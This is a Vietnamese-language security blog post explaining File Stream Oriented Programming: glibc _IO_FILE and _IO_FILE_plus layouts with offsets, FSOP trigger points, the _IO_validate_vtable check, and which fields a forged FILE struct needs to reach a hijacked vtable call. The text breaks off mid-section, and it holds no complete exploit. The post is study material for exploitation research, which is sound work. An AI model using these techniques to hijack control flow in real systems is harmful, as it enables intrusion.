<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>File Stream Oriented Programming (FSOP) | H00d1eBl4ck</title><meta name="author" content="H00d1eBl4ck"><meta name="copyright" content="H00d1eBl4ck"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Khái niệm về FILE struct FILE là kiểu dữ liệu (struct) mà thư viện C chuẩn (stdio) dùng để đại diện cho một luồng I&#x2F;O (stream) — ví dụ: file trên đĩa, stdin&#x2F;stdout, pipe, socket… khi dùng fo">
<meta property="og:type" content="article">
<meta property="og:title" content="File Stream Oriented Programming (FSOP)">
<meta property="og:url" content="https://elliotbigfan.github.io/2026/01/14/Research/pwn/fsop/index.html">
<meta property="og:site_name" content="H00d1eBl4ck">
<meta property="og:description" content="Khái niệm về FILE struct FILE là kiểu dữ liệu (struct) mà thư viện C chuẩn (stdio) dùng để đại diện cho một luồng I&#x2F;O (stream) — ví dụ: file trên đĩa, stdin&#x2F;stdout, pipe, socket… khi dùng fo">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://elliotbigfan.github.io/img/favicon_io/android-chrome-512x512.png">
<meta property="article:published_time" content="2026-01-14T02:31:32.000Z">
<meta property="article:modified_time" content="2026-01-14T05:47:33.932Z">
<meta property="article:author" content="H00d1eBl4ck">
<meta property="article:tag" content="Research">
<meta property="article:tag" content="Pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://elliotbigfan.github.io/img/favicon_io/android-chrome-512x512.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "File Stream Oriented Programming (FSOP)",
  "url": "https://elliotbigfan.github.io/2026/01/14/Research/pwn/fsop/",
  "image": "https://elliotbigfan.github.io/img/favicon_io/android-chrome-512x512.png",
  "datePublished": "2026-01-14T02:31:32.000Z",
  "dateModified": "2026-01-14T05:47:33.932Z",
  "author": [
    {
      "@type": "Person",
      "name": "H00d1eBl4ck",
      "url": "https://elliotbigfan.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon_io/favicon.ico"><link rel="canonical" href="https://elliotbigfan.github.io/2026/01/14/Research/pwn/fsop/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyloadPlugin: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'File Stream Oriented Programming (FSOP)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/favicon_io/android-chrome-192x192.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">10</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/bookmark/"><i class="fa-fw fas fa-bookmark"></i><span> Bookmark</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-person"></i><span> About Me</span></a></div><div class="menus_item"><a class="site-page" href="/certificate/"><i class="fa-fw fas fa-certificate"></i><span> Certificate</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/favicon_io/android-chrome-512x512.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/favicon_io/favicon.ico" alt="Logo"><span class="site-name">H00d1eBl4ck</span></a><a class="nav-page-title" href="/"><span class="site-name">File Stream Oriented Programming (FSOP)</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/bookmark/"><i class="fa-fw fas fa-bookmark"></i><span> Bookmark</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-person"></i><span> About Me</span></a></div><div class="menus_item"><a class="site-page" href="/certificate/"><i class="fa-fw fas fa-certificate"></i><span> Certificate</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">File Stream Oriented Programming (FSOP)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-01-14T02:31:32.000Z" title="Created 2026-01-14 09:31:32">2026-01-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-01-14T05:47:33.932Z" title="Updated 2026-01-14 12:47:33">2026-01-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Research/">Research</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Research/FSOP/">FSOP</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">2.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>17mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Khai-niem-ve-FILE-struct"><a href="#Khai-niem-ve-FILE-struct" class="headerlink" title="Khái niệm về FILE struct"></a>Khái niệm về FILE struct</h1><ul>
<li>FILE là kiểu dữ liệu (struct) mà thư viện C chuẩn (stdio) dùng để đại diện cho một <strong>luồng I&#x2F;O</strong> (stream) — ví dụ: file trên đĩa, stdin&#x2F;stdout, pipe, socket… khi dùng <strong>fopen&#x2F;fread&#x2F;fwrite&#x2F;fprintf&#x2F;fclose</strong></li>
</ul>
<h2 id="Cau-truc-cua-FILE-trong-glibc"><a href="#Cau-truc-cua-FILE-trong-glibc" class="headerlink" title="Cấu trúc của FILE trong glibc:"></a>Cấu trúc của FILE trong glibc:</h2><ul>
<li><p>Trong glibc, FILE (thường là <code>_IO_FILE</code> &#x2F; <code>_IO_FILE_plus</code>) là một struct lớn có:</p>
<ul>
<li>buffer pointers (đang đọc&#x2F;ghi tới đâu)</li>
<li>flags&#x2F;mode (đọc&#x2F;ghi, wide&#x2F;byte, lỗi&#x2F;EOF…)</li>
<li>file descriptor (fd)</li>
<li>lock (mutex) để thread-safe</li>
<li>con trỏ vtable&#x2F;jump table (bảng hàm) quyết định khi “ghi&#x2F;flush&#x2F;đóng” thì gọi hàm nào. (phần quan trọng nhất)</li>
</ul>
</li>
<li><p>Để hiểu sâu hơn về cấu trúc FILE và vtable trên bạn có thể đọc qua các bài viết dưới đây:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://hackmd.io/@ChinoKafuu/r1W3T5aIh">https://hackmd.io/@ChinoKafuu/r1W3T5aIh</a></li>
<li><a target="_blank" rel="noopener" href="https://d0ublew.github.io/notes/pwn/fsop/index.html">https://d0ublew.github.io/notes/pwn/fsop/index.html</a></li>
<li><a target="_blank" rel="noopener" href="https://lactea.kr/entry/pwnable-IOFILE-structure-and-vtable-overwrite">https://lactea.kr/entry/pwnable-IOFILE-structure-and-vtable-overwrite</a></li>
</ul>
</li>
</ul>
<h1 id="Khai-niem-ve-FSOP"><a href="#Khai-niem-ve-FSOP" class="headerlink" title="Khái niệm về FSOP"></a>Khái niệm về FSOP</h1><ul>
<li><p>FSOP (File Stream Oriented Programming) là kỹ thuật khai thác trong pwn, trong đó bạn tấn công vào cấu trúc FILE của glibc (stdio) để điều khiển luồng thực thi.</p>
</li>
<li><p>Nếu bạn có bug cho phép:</p>
<ul>
<li>ghi đè nội dung struct FILE (ví dụ overwrite <em>IO_2_1_stdout</em>), hoặc đổi con trỏ FILE* trỏ vào vùng bạn kiểm soát (fake FILE trên heap), thì khi chương trình gọi các hàm stdio hoặc lúc exit()&#x2F;fflush()&#x2F;fclose(), glibc sẽ:<ul>
<li>đọc các field bạn đã sửa, gọi hàm qua vtable, và bạn có thể “lái” nó sang gọi hàm như system() hoặc tạo primitive R&#x2F;W khác.</li>
</ul>
</li>
</ul>
</li>
<li><p>FSOP thường trigger ở đâu?</p>
<ul>
<li><code>exit()</code> (glibc flush các stream, ví dụ: exit(1) –&gt; flush stdout)</li>
<li><code>fflush(stream)</code></li>
<li><code>fclose(stream)</code></li>
<li>các thao tác in&#x2F;ghi như <code>printf</code>, <code>fputs</code>, <code>fwrite</code></li>
</ul>
</li>
</ul>
<h1 id="Ky-thuat-tan-cong-FSOP"><a href="#Ky-thuat-tan-cong-FSOP" class="headerlink" title="Kỹ thuật tấn công FSOP"></a>Kỹ thuật tấn công FSOP</h1><h2 id="FSOP-glibc"><a href="#FSOP-glibc" class="headerlink" title="FSOP (glibc &lt;&#x3D; 2.23)"></a>FSOP (glibc &lt;&#x3D; 2.23)</h2><ul>
<li>Đối với các glibc phiên bản từ 2.23 trở xuống thì việc khai thác tương đối đơn giản nhưng cũng cần phải hiểu cách khai thác để có thể hiểu cách tấn công FSOP cho các phiên bản glibc mới hơn.</li>
<li>Để kiểm tra GLIBC hiện tại của chương trình ta có thể dùng lệnh:</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings &lt;tên chương trình&gt; | grep GLIBC</span><br></pre></td></tr></table></figure>

<ul>
<li>Trong output trả về phiên bản GLIBC của chương trình sẽ là GLIBC có version cao nhất trong output.</li>
<li>Ở đây mình sẽ không viết về FSOP với glibc &lt;&#x3D; 2.23, các bạn có thể đọc qua blog dưới đây để hiểu cách khai thác dạng bài này:<ul>
<li><a target="_blank" rel="noopener" href="https://lactea.kr/entry/pwnable-IOFILE-structure-and-vtable-overwrite#vtable-overwrite">https://lactea.kr/entry/pwnable-IOFILE-structure-and-vtable-overwrite#vtable-overwrite</a></li>
</ul>
</li>
</ul>
<h2 id="FSOP-glibc-2-24"><a href="#FSOP-glibc-2-24" class="headerlink" title="FSOP (glibc &gt;&#x3D; 2.24)"></a>FSOP (glibc &gt;&#x3D; 2.24)</h2><h3 id="IO-validate-vtable"><a href="#IO-validate-vtable" class="headerlink" title="_IO_validate_vtable:"></a>_IO_validate_vtable:</h3><ul>
<li>Ở các phiên bản glibc từ 2.24 trở đi đã có thêm 1 cơ chế bảo vệ mới nhằm ngăn việc fake vtable quá dễ dàng là <code>_IO_validate_vtable()</code>.</li>
<li>Khi glibc chuẩn bị gọi kiểu:</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;vtable-&gt;__overflow(fp, ...)</span><br><span class="line"></span><br><span class="line">fp-&gt;vtable-&gt;__xsputn(fp, ...)</span><br><span class="line"></span><br><span class="line">fp-&gt;vtable-&gt;__close(fp) …</span><br></pre></td></tr></table></figure>

<ul>
<li><code>_IO_validate_vtable()</code> sẽ kiểm tra: vtable pointer có nằm trong vùng vtable hợp lệ của glibc hay không.</li>
</ul>
<h3 id="Nhung-field-quan-trong-trong-struct-IO-FILE-va-IO-FILE-plus"><a href="#Nhung-field-quan-trong-trong-struct-IO-FILE-va-IO-FILE-plus" class="headerlink" title="Những field quan trọng trong struct _IO_FILE và _IO_FILE_plus"></a>Những field quan trọng trong struct _IO_FILE và _IO_FILE_plus</h3><ul>
<li>Nhắc lại _IO_FILE và _IO_FILE_plus:</li>
</ul>
<p><strong>1. _IO_FILE</strong></p>
<ul>
<li>struct _IO_FILE</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields only exist if `_IO_USE_OLD_IO_FILE` is not defined */</span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>_IO_FILE field offsets:</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; ptype /ox <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>      |    <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0000      |  0x0004 */</span>    <span class="type">int</span> _flags;</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x0008      |  0x0008 */</span>    <span class="type">char</span> *_IO_read_ptr;</span><br><span class="line"><span class="comment">/* 0x0010      |  0x0008 */</span>    <span class="type">char</span> *_IO_read_end;</span><br><span class="line"><span class="comment">/* 0x0018      |  0x0008 */</span>    <span class="type">char</span> *_IO_read_base;</span><br><span class="line"><span class="comment">/* 0x0020      |  0x0008 */</span>    <span class="type">char</span> *_IO_write_base;</span><br><span class="line"><span class="comment">/* 0x0028      |  0x0008 */</span>    <span class="type">char</span> *_IO_write_ptr;</span><br><span class="line"><span class="comment">/* 0x0030      |  0x0008 */</span>    <span class="type">char</span> *_IO_write_end;</span><br><span class="line"><span class="comment">/* 0x0038      |  0x0008 */</span>    <span class="type">char</span> *_IO_buf_base;</span><br><span class="line"><span class="comment">/* 0x0040      |  0x0008 */</span>    <span class="type">char</span> *_IO_buf_end;</span><br><span class="line"><span class="comment">/* 0x0048      |  0x0008 */</span>    <span class="type">char</span> *_IO_save_base;</span><br><span class="line"><span class="comment">/* 0x0050      |  0x0008 */</span>    <span class="type">char</span> *_IO_backup_base;</span><br><span class="line"><span class="comment">/* 0x0058      |  0x0008 */</span>    <span class="type">char</span> *_IO_save_end;</span><br><span class="line"><span class="comment">/* 0x0060      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"><span class="comment">/* 0x0068      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"><span class="comment">/* 0x0070      |  0x0004 */</span>    <span class="type">int</span> _fileno;</span><br><span class="line"><span class="comment">/* 0x0074      |  0x0004 */</span>    <span class="type">int</span> _flags2;</span><br><span class="line"><span class="comment">/* 0x0078      |  0x0008 */</span>    <span class="type">__off_t</span> _old_offset;</span><br><span class="line"><span class="comment">/* 0x0080      |  0x0002 */</span>    <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line"><span class="comment">/* 0x0082      |  0x0001 */</span>    <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line"><span class="comment">/* 0x0083      |  0x0001 */</span>    <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x0088      |  0x0008 */</span>    _IO_lock_t *_lock;</span><br><span class="line"><span class="comment">/* 0x0090      |  0x0008 */</span>    <span class="type">__off64_t</span> _offset;</span><br><span class="line"><span class="comment">/* 0x0098      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line"><span class="comment">/* 0x00a0      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line"><span class="comment">/* 0x00a8      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line"><span class="comment">/* 0x00b0      |  0x0008 */</span>    <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="comment">/* 0x00b8      |  0x0008 */</span>    <span class="type">size_t</span> __pad5;</span><br><span class="line"><span class="comment">/* 0x00c0      |  0x0004 */</span>    <span class="type">int</span> _mode;</span><br><span class="line"><span class="comment">/* 0x00c4      |  0x0014 */</span>    <span class="type">char</span> _unused2[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):  216 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>

<p><strong>2. _IO_FILE_plus</strong></p>
<ul>
<li>struct _IO_FILE_plus</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> <span class="title">FILE</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>_IO_FILE_plus field offsets</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; ptype /ox <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>      |    <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0000      |  0x00d8 */</span>    FILE file;</span><br><span class="line"><span class="comment">/* 0x00d8      |  0x0008 */</span>    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):  224 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Từ cấu trúc trên mình sẽ lọc ra các fields quan trọng và bắt buộc phải có để fake vtable thành công.</li>
<li>Các fields quan trọng nhất cho FSOP thường nằm trong 4 nhóm:</li>
</ul>
<p><strong>Nhóm A — Anti-crash &#x2F; hợp lệ hóa</strong></p>
<ul>
<li>Các field này nhằm bypass các đoạn sanity-check&#x2F;locking mà không segfault trước khi tới vtable call.</li>
</ul>
<ol>
<li><code>_lock</code> (offset 0x88)</li>
</ol>
<ul>
<li>Khi flush&#x2F;exit, glibc thường lock stream trước.</li>
</ul>
<p><code>_lock</code> phải trỏ tới object lock hợp lệ (ví dụ <code>_IO_stdfile_1_lock</code>).</p>
<p>Nếu <code>_lock</code> rác sẽ crash trước khi gọi vtable.</p>
<ol start="2">
<li><code>_fileno</code> (offset 0x70)</li>
</ol>
<ul>
<li>Không phải lúc nào bắt buộc, nhưng nhiều path dùng fd để write&#x2F;close.</li>
<li>Fake FILE mà _fileno rác có thể crash ở syscall hoặc logic check.</li>
</ul>
<ol start="3">
<li><code>_flags</code> (offset 0x00)</li>
</ol>
<ul>
<li>Có thể ảnh hưởng mạnh đến codepath: readable&#x2F;writable, buffering, error flags…</li>
</ul>
<p><strong>Nhóm B — Buffer pointers (để ép call tới overflow&#x2F;doallocate&#x2F;write…)</strong></p>
<ul>
<li>Các pointer như:</li>
</ul>
